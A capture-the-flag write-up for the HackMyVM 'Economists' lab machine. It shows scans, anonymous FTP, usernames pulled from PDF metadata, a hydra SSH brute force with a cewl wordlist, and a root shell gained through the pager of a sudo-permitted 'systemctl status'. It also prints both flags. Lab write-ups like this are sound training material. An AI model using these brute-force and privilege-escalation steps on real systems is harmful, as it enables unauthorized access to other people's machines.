| Name       | Difficulty | OS    | Target IP     | Link                                                   |
| ---------- | ---------- | ----- | ------------- | ------------------------------------------------------ |
| Economists | Easy       | Linux | 192.168.0.193 | https://hackmyvm.eu/machines/machine.php?vm=Economists |
### ARP Scan

```bash
garffff@garffff:~/hackmyvm/economists$ sudo arp-scan -l | grep e3
192.168.0.193	08:00:27:e0:55:e3	PCS Systemtechnik GmbH
```

### Nmap TCP Scan

```bash
garffff@garffff:~/hackmyvm/economists$ sudo nmap -p- -sV -sC 192.168.0.193 -oA economists.tcp
[sudo] password for garffff:            
Starting Nmap 7.80 ( https://nmap.org ) at 2024-10-30 12:44 GMT
Nmap scan report for 192.168.0.193
Host is up (0.000081s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 1000     1000       173864 Sep 13  2023 Brochure-1.pdf
| -rw-rw-r--    1 1000     1000       183931 Sep 13  2023 Brochure-2.pdf
| -rw-rw-r--    1 1000     1000       465409 Sep 13  2023 Financial-infographics-poster.pdf
| -rw-rw-r--    1 1000     1000       269546 Sep 13  2023 Gameboard-poster.pdf
| -rw-rw-r--    1 1000     1000       126644 Sep 13  2023 Growth-timeline.pdf
|_-rw-rw-r--    1 1000     1000      1170323 Sep 13  2023 Population-poster.pdf
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.0.51
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Home - Elite Economists
MAC Address: 08:00:27:E0:55:E3 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.51 seconds
```

### FTP

FTP allows anonymous access. Logging into the FTP service there are many PDF files:

```bash
garffff@garffff:~/hackmyvm/economists/ftp$ ftp 192.168.0.193
Connected to 192.168.0.193.
220 (vsFTPd 3.0.3)
Name (192.168.0.193:garffff): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||28746|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000       173864 Sep 13  2023 Brochure-1.pdf
-rw-rw-r--    1 1000     1000       183931 Sep 13  2023 Brochure-2.pdf
-rw-rw-r--    1 1000     1000       465409 Sep 13  2023 Financial-infographics-poster.pdf
-rw-rw-r--    1 1000     1000       269546 Sep 13  2023 Gameboard-poster.pdf
-rw-rw-r--    1 1000     1000       126644 Sep 13  2023 Growth-timeline.pdf
-rw-rw-r--    1 1000     1000      1170323 Sep 13  2023 Population-poster.pdf
226 Directory send OK.
```

Downloading PDF files:

```bash
ftp> prompt off
ftp> mget *
local: Brochure-1.pdf remote: Brochure-1.pdf
229 Entering Extended Passive Mode (|||6734|)
150 Opening BINARY mode data connection for Brochure-1.pdf (173864 bytes).
100% |*************************************************************************************************************************************************************************************************|   169 KiB   47.74 MiB/s    00:00 ETA
226 Transfer complete.
173864 bytes received in 00:00 (43.93 MiB/s)
local: Brochure-2.pdf remote: Brochure-2.pdf
229 Entering Extended Passive Mode (|||52135|)
150 Opening BINARY mode data connection for Brochure-2.pdf (183931 bytes).
100% |*************************************************************************************************************************************************************************************************|   179 KiB   61.26 MiB/s    00:00 ETA
226 Transfer complete.
183931 bytes received in 00:00 (48.88 MiB/s)
local: Financial-infographics-poster.pdf remote: Financial-infographics-poster.pdf
229 Entering Extended Passive Mode (|||12900|)
150 Opening BINARY mode data connection for Financial-infographics-poster.pdf (465409 bytes).
100% |*************************************************************************************************************************************************************************************************|   454 KiB   68.44 MiB/s    00:00 ETA
226 Transfer complete.
465409 bytes received in 00:00 (59.12 MiB/s)
local: Gameboard-poster.pdf remote: Gameboard-poster.pdf
229 Entering Extended Passive Mode (|||55314|)
150 Opening BINARY mode data connection for Gameboard-poster.pdf (269546 bytes).
100% |*************************************************************************************************************************************************************************************************|   263 KiB   70.23 MiB/s    00:00 ETA
226 Transfer complete.
269546 bytes received in 00:00 (67.16 MiB/s)
local: Growth-timeline.pdf remote: Growth-timeline.pdf
229 Entering Extended Passive Mode (|||27429|)
150 Opening BINARY mode data connection for Growth-timeline.pdf (126644 bytes).
100% |*************************************************************************************************************************************************************************************************|   123 KiB  112.55 MiB/s    00:00 ETA
226 Transfer complete.
126644 bytes received in 00:00 (83.69 MiB/s)
local: Population-poster.pdf remote: Population-poster.pdf
229 Entering Extended Passive Mode (|||62383|)
150 Opening BINARY mode data connection for Population-poster.pdf (1170323 bytes).
100% |*************************************************************************************************************************************************************************************************|  1142 KiB  206.41 MiB/s    00:00 ETA
226 Transfer complete.
1170323 bytes received in 00:00 (197.75 MiB/s)

```

Looking at the meta data of these files, we see potential usernames:

```bash
garffff@garffff:~/hackmyvm/economists/ftp$ exiftool * | grep Author
Author                          : joseph
Author                          : richard
Author                          : crystal
Author                          : catherine
Author                          : catherine
```

Modifying the outputted users and saving to a text file:

```bash
garffff@garffff:~/hackmyvm/economists/ftp$ exiftool * | grep Author | cut -d ":" -f 2 > ../users.txt
```

We need a list of password, using cewl, we can create a password list of the words found on the website:

```bash
garffff@garffff:~/hackmyvm/economists$ cewl -d 2 -a http://192.168.0.193/ -w pass.txt

CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```

### Bruteforce SSH

An attempt was made to brute force via SSH:

```bash
garffff@garffff:~/hackmyvm/economists$ hydra -L users.txt -P pass.txt ssh://192.168.0.193 -I -VV -F
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-30 15:47:02
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 2305 login tries (l:5/p:461), ~145 tries per task
[DATA] attacking ssh://192.168.0.193:22/
[ATTEMPT] target 192.168.0.193 - login "joseph" - pass "the" - 1 of 2305 [child 0] (0/0)
[ATTEMPT] target 192.168.0.193 - login "joseph" - pass "and" - 2 of 2305 [child 1] (0/0)
[ATTEMPT] target 192.168.0.193 - login "joseph" - pass "far" - 3 of 2305 [child 2] (0/0)
[ATTEMPT] target 192.168.0.193 - login "joseph" - pass "blind" - 4 of 2305 [child 3] (0/0)
[ATTEMPT] target 192.168.0.193 - login "joseph" - pass "texts" - 5 of 2305 [child 4] (0/0)
[ATTEMPT] target 192.168.0.193 - login "joseph" - pass "live" - 6 of 2305 [child 5] (0/0)
[ATTEMPT] target 192.168.0.193 - login "joseph" - pass "Marketing" - 7 of 2305 [child 6] (0/0)
[ATTEMPT] target 192.168.0.193 - login "joseph" - pass "your" - 8 of 2305 [child 7] (0/0)

<--SNIP-->

[22][ssh] host: 192.168.0.193   login: joseph   password: wealthiest
[STATUS] attack finished for 192.168.0.193 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-30 15:49:34

```

A match was found `joseph:wealthiest`

Using these details, it was then possible to log in the host, and grab the first user flag:

```bash
garffff@garffff:~/hackmyvm/economists/ftp$ ssh joseph@192.168.0.193
The authenticity of host '192.168.0.193 (192.168.0.193)' can't be established.
ED25519 key fingerprint is SHA256:nKBoUMUnxyKH34KaiDU6gjV4RVOrd181pL9rHCLLD0s.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.193' (ED25519) to the list of known hosts.
joseph@192.168.0.193's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 30 Oct 2024 03:50:13 PM UTC

  System load:             0.05
  Usage of /:              49.2% of 11.21GB
  Memory usage:            7%
  Swap usage:              0%
  Processes:               122
  Users logged in:         0
  IPv4 address for enp0s3: 192.168.0.193
  IPv6 address for enp0s3: 2a00:23c6:2989:ca01:a00:27ff:fee0:55e3


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

51 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
New release '22.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


joseph@elite-economists:~$ ls -lash
total 32K
4.0K drwxr-xr-x 4 joseph joseph 4.0K Oct 30 13:40 .
4.0K drwxr-xr-x 6 root   root   4.0K Sep 13  2023 ..
   0 -rw------- 1 joseph joseph    0 Sep 14  2023 .bash_history
4.0K -rw-r--r-- 1 joseph joseph  220 Sep 13  2023 .bash_logout
4.0K -rw-r--r-- 1 joseph joseph 3.7K Sep 13  2023 .bashrc
4.0K drwx------ 2 joseph joseph 4.0K Oct 30 13:40 .cache
4.0K drwxrwxr-x 3 joseph joseph 4.0K Sep 13  2023 .local
4.0K -rw-r--r-- 1 joseph joseph  807 Sep 13  2023 .profile
4.0K -rw-rw-r-- 1 joseph joseph 3.2K Sep 14  2023 user.txt
joseph@elite-economists:~$ cat user.txt 


                                                                                                    
                                                                                                    
                      ...................                 ....................                      
                 .............................        .............................                 
             ............              ...........     ......              ............             
           ........                         ........                             ........           
        ........              ...              ........           ....              .......         
       ......                .....         ..     ......          .....                ......       
     .............................        .....     ......        .............................     
    ..............................       .....        .....       ..............................    
                                        .....          .....                                        
                                       .....            .....                                       
                                      .....              .....                                      
                                      .....              .....                                      
                                     .....                ....                                      
 .................................................................................................. 
................................................................................................... 
                                     .....               .....                                      
                                      .....              .....                                      
                                      .....              .....                                      
                                       .....            .....                                       
                                        .....          .....                                        
    ..............................       .....        .....       ..............................    
     .............................        ......     .....        .............................     
       ......                .....         .......     ..         .....                ......       
        ........              ...            .......              ....              .......         
           ........                            .........                         ........           
             ...........               ......     ...........               ...........             
                ..............................       ..............................                 
                     .....................                ....................                      
                                                                                                    
                                                                                                    
Flag: HMV{37q3p33CsMJgJQbrbYZMUFfTu}
```

Looking at what command we can run as sudo:

```bash
joseph@elite-economists:~$ sudo -l
Matching Defaults entries for joseph on elite-economists:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joseph may run the following commands on elite-economists:
    (ALL) NOPASSWD: /usr/bin/systemctl status

```

Looking at the `systemcrl status`, which essentially using the less function, it is possible to escape this page and obtain a root shell:

```bash
joseph@elite-economists:~$ sudo /usr/bin/systemctl status
● elite-economists
    State: running
     Jobs: 0 queued
   Failed: 0 units
    Since: Wed 2024-10-30 12:42:33 UTC; 3h 20min ago
   CGroup: /
           ├─user.slice 
           │ └─user-1001.slice 
           │   ├─user@1001.service …
           │   │ └─init.scope 
           │   │   ├─4513 /lib/systemd/systemd --user
           │   │   └─4514 (sd-pam)
           │   └─session-16.scope 
           │     ├─4497 sshd: joseph [priv]
           │     ├─4598 sshd: joseph@pts/0
           │     ├─4599 -bash
           │     ├─4667 sudo /usr/bin/systemctl status
           │     ├─4668 /usr/bin/systemctl status
           │     └─4669 pager
           ├─init.scope 
           │ └─1 /sbin/init maybe-ubiquity
           └─system.slice 
             ├─apache2.service 
             │ ├─ 753 /usr/sbin/apache2 -k start
             │ ├─ 758 /usr/sbin/apache2 -k start
             │ ├─ 759 /usr/sbin/apache2 -k start
             │ └─2304 /usr/sbin/apache2 -k start
             ├─systemd-networkd.service 
             │ └─634 /lib/systemd/systemd-networkd
             ├─systemd-udevd.service 
             │ └─396 /lib/systemd/systemd-udevd
             ├─cron.service 
             │ └─652 /usr/sbin/cron -f
             ├─polkit.service 
             │ └─661 /usr/lib/policykit-1/polkitd --no-debug
             ├─networkd-dispatcher.service 
             │ └─660 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
             ├─multipathd.service 
             │ └─553 /sbin/multipathd -d -s
             ├─accounts-daemon.service 
             │ └─648 /usr/lib/accountsservice/accounts-daemon
             ├─ModemManager.service 
             │ └─738 /usr/sbin/ModemManager
             ├─systemd-journald.service 
             │ └─362 /lib/systemd/systemd-journald
             ├─atd.service 
             │ └─681 /usr/sbin/atd -f
             ├─unattended-upgrades.service 
             │ └─737 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
             ├─ssh.service 
             │ └─725 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
             ├─snapd.service 
             │ └─1225 /usr/lib/snapd/snapd
             ├─vsftpd.service 
             │ └─672 /usr/sbin/vsftpd /etc/vsftpd.conf
             ├─rsyslog.service 
             │ └─662 /usr/sbin/rsyslogd -n -iNONE
             ├─systemd-resolved.service 
lines 1-58
!bash
```

Now we can grab the root flag:

```bash
root@elite-economists:/home/joseph# whoami && id
root
uid=0(root) gid=0(root) groups=0(root)
root@elite-economists:/home/joseph# cd /root
root@elite-economists:~# ls
root.txt  snap
root@elite-economists:~# cat root.txt 


                                                                                                    
                                                                                                    
                      ...................                 ....................                      
                 .............................        .............................                 
             ............              ...........     ......              ............             
           ........                         ........                             ........           
        ........              ...              ........           ....              .......         
       ......                .....         ..     ......          .....                ......       
     .............................        .....     ......        .............................     
    ..............................       .....        .....       ..............................    
                                        .....          .....                                        
                                       .....            .....                                       
                                      .....              .....                                      
                                      .....              .....                                      
                                     .....                ....                                      
 .................................................................................................. 
................................................................................................... 
                                     .....               .....                                      
                                      .....              .....                                      
                                      .....              .....                                      
                                       .....            .....                                       
                                        .....          .....                                        
    ..............................       .....        .....       ..............................    
     .............................        ......     .....        .............................     
       ......                .....         .......     ..         .....                ......       
        ........              ...            .......              ....              .......         
           ........                            .........                         ........           
             ...........               ......     ...........               ...........             
                ..............................       ..............................                 
                     .....................                ....................                      
                                                                                                    
                                                                                                    
Flag: HMV{NwER6XWyM8p5VpeFEkkcGYyeJ}
```
